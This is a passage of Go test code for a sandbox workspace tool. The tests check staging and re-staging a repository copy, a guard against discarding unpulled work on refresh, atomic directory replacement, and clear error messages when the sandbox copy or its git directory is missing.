	if rec, err := LoadCopy(e.data, "c1"); err != nil || rec.UploadedAt == nil || rec.Baseline != before.Baseline || !pathExists(rec.BaseGit) {
		t.Fatalf("failed re-stage changed the copy: %+v %v", rec, err)
	}
	// One that succeeds but is never uploaded remembers the copy the
	// sandbox still holds, so Refresh keeps guarding the work in it.
	rec, err := Stage(bg, opts)
	if err != nil || rec.UploadedAt != nil || rec.Replaced == nil || rec.Replaced.RemoteDir != remoteRepo || rec.Replaced.Baseline != before.Baseline {
		t.Fatalf("re-staged record: %+v, %v", rec, err)
	}
	if again, err := Stage(bg, opts); err != nil || again.Replaced == nil || *again.Replaced != *rec.Replaced {
		t.Fatalf("second re-stage lost the uploaded copy: %+v %v", again, err)
	}
	fs.write(remoteRepo+"/agent.txt", "agent work\n")
	ropts := e.refreshOpts("c1", fs)
	if _, err := Refresh(bg, ropts); !errors.Is(err, ErrUnpulledChanges) {
		t.Fatalf("guard skipped for a re-staged copy: %v", err)
	}
	ropts.Force = true
	if rec, err = Refresh(bg, ropts); err != nil || rec.Replaced != nil || rec.UploadedAt == nil || pathExists(fs.local(remoteRepo+"/agent.txt")) {
		t.Fatalf("forced refresh: %+v, %v", rec, err)
	}

	// DeleteCopy also removes what an interrupted stage left behind, and
	// the then empty sandbox directory.
	mustMkdir(t, filepath.Join(e.data, "sandboxes", "c1", "copy"+copyNewInfix+"0123", "stage"))
	mustMkdir(t, filepath.Join(e.data, "sandboxes", "c1", "copy"+copyOldInfix+"4567"))
	must(t, DeleteCopy(e.data, "c1"))
	wantFiles(t, e.data, "sandboxes/c1", absent)
}

func TestReplaceDirKeepsOneLiveDirectory(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	live := filepath.Join(root, "copy")
	stage := func(content string) string {
		dir := filepath.Join(root, "copy"+copyNewInfix+randomSuffix())
		writeFile(t, dir, "copy.json", content)
		return dir
	}
	// No live directory yet: a plain rename.
	old, err := replaceDir(stage("one"), live, exchangeDirs)
	if err != nil || old != "" || readFile(t, live, "copy.json") != "one" {
		t.Fatalf("first install: %q %v", old, err)
	}
	// The platform exchange (or its fallback where there is none).
	old, err = replaceDir(stage("two"), live, exchangeDirs)
	if err != nil || readFile(t, live, "copy.json") != "two" || readFile(t, old, "copy.json") != "one" {
		t.Fatalf("exchange: %q %v", old, err)
	}
	// Without an exchange the live directory is moved aside first.
	noExchange := func(string, string) error { return errors.ErrUnsupported }
	old, err = replaceDir(stage("three"), live, noExchange)
	if err != nil || readFile(t, live, "copy.json") != "three" || readFile(t, old, "copy.json") != "two" ||
		!strings.HasPrefix(filepath.Base(old), "copy"+copyOldInfix) {
		t.Fatalf("fallback: %q %v", old, err)
	}
	// A failed move puts the live directory back.
	if _, err := replaceDir(filepath.Join(root, "missing"), live, noExchange); err == nil || readFile(t, live, "copy.json") != "three" {
		t.Fatalf("failed install = %v, or it lost the live directory", err)
	}
}

// quietExec answers every command with exit 1 and no output.
type quietExec struct{}

func (quietExec) Exec(context.Context, string, ExecRequest) (*ExecResult, error) {
	return &ExecResult{ExitCode: 1}, nil
}

// Setting the baseline says which part of the copy is missing in the
// sandbox. It used to fail with an empty reason ("set the baseline in the
// sandbox (exit 1): ") when the upload had not arrived there.
func TestBaselineSaysWhatIsMissing(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	_, fs := launchCopy(t, e, "c1", nil)
	// The fake sandbox runs the script with its paths rewritten.
	repo := fs.rewrite(remoteRepo)
	if err := os.RemoveAll(fs.local(remoteRepo + "/.git")); err != nil {
		t.Fatal(err)
	}
	if _, err := EstablishBaseline(bg, e.data, "c1", fs); err == nil ||
		err.Error() != "workspace: set the baseline in the sandbox (exit 1): "+repo+"/.git is missing: the copy has no git directory" {
		t.Fatalf("baseline without the git directory = %v", err)
	}
	if err := os.RemoveAll(fs.local(remoteRepo)); err != nil {
		t.Fatal(err)
	}
	if _, err := EstablishBaseline(bg, e.data, "c1", fs); err == nil ||
		err.Error() != "workspace: set the baseline in the sandbox (exit 1): "+repo+" is missing: the copy is not in the sandbox" {
		t.Fatalf("baseline without the copy = %v", err)
	}
	if _, err := EstablishBaseline(bg, e.data, "c1", quietExec{}); err == nil ||
		err.Error() != "workspace: set the baseline in the sandbox (exit 1): it printed no error" {
		t.Fatalf("baseline that fails silently = %v", err)
	}
}
